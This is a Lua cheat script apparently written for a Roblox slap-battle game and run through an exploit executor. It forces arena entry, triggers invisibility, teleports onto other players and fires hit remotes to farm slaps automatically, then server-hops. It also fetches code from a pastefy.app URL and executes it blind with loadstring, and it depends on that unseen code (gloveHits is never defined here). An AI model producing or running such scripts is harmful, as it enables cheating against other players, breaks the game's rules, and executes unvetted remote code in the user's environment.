SlapTime = 10

local totalSlaps = 0

if game.Players.LocalPlayer.Character:FindFirstChild("entered") == nil and game.Players.LocalPlayer.leaderstats.Slaps.Value >= 666 then
	OGlove = game.Players.LocalPlayer.leaderstats.Glove.Value
	fireclickdetector(workspace.Lobby.Ghost.ClickDetector)
	game.ReplicatedStorage.Ghostinvisibilityactivated:FireServer()
	game.ReplicatedStorage.Ghostinvisibilityactivated:FireServer()
	fireclickdetector(workspace.Lobby[OGlove].ClickDetector)
end

wait()

if game.Players.LocalPlayer.Character:FindFirstChild("entered") == nil then
    repeat 
        task.wait()
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 1)
    until game.Players.LocalPlayer.Character:FindFirstChild("entered")
end

loadstring(game:HttpGet"https://pastefy.app/ItJRg4gG/raw")()

workspace.BountyHunterRoom.BountyHunterBooth._configPart.OpenRemote:InvokeServer()
wait(.2)
workspace.BountyHunterRoom.BountyHunterBooth._configPart.LeaveRemote:FireServer()
wait()
game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
while true do
    if game.Players.LocalPlayer.Character.Humanoid.Health == 0 or totalSlaps >= SlapTime then 
        break 
    end

    for i,v in next, game.Players:GetChildren() do
        if v ~= game.Players.LocalPlayer and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and v.Character then
            if game.Players.LocalPlayer.Character:FindFirstChild("entered") and v.Character:FindFirstChild("entered") and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("stevebody") == nil and v.Character:FindFirstChild("rock") == nil and v.Character.HumanoidRootPart.BrickColor ~= BrickColor.new("New Yeller") and v.Character.Ragdolled.Value == false then
                if v.Character.Head:FindFirstChild("UnoReverseCard") == nil or game.Players.LocalPlayer.leaderstats.Glove.Value == "Error" then
                    task.wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0,10,0)
                    task.wait(0.3)
                    gloveHits[game.Players.LocalPlayer.leaderstats.Glove.Value]:FireServer(v.Character:WaitForChild("HumanoidRootPart"),true)
                    task.wait(0.45)
                end
            end
        end
    end

    task.wait()
end

local serverList = {}
for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
	if v.playing and type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
		serverList[#serverList + 1] = v.id
	end
end
if #serverList > 0 then
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
end
